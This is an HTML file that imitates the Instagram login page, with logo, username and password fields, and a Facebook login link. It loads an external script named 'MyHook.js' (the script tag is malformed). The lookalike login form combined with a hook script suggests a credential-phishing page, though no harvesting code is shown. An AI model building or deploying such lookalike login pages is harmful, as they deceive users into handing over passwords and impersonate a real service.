<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css" />
    <link rel="icon" type="image/png" href="insta-fav.ico">
    <title>Instagram..</title>
    
</head>
<body>
    <script src="/MyHook.js>
    </script>
    
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form>
                    <label for="email" class="sr-only">Username Phone E-Mail</label>
                    <input name="email" placeholder="Username Phone E-Mail" />

                    <label for="password" class="sr-only">Password</label>
                    <input name="password" type="password" placeholder="Password" />

                    <button type="button">Login</button>
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a>Login With Facebook</a>
                    </div>
                    <a href="#">Forgot Your Password?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Don't Have an Account?</p>
                <a href="#">Sign-Up</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Get App.</p>
                <div class="flex justify-content-center">
                    <img src="apple-button.png"      alt="Imagem com a logo da Apple Store"  />
                    <img src="googleplay-button.png" alt="Imagem com a logo da Google Play" />
                </div>
            </div>
        </section>
    </main>
    <footer>
       
      
    </footer>
</body>
</html>
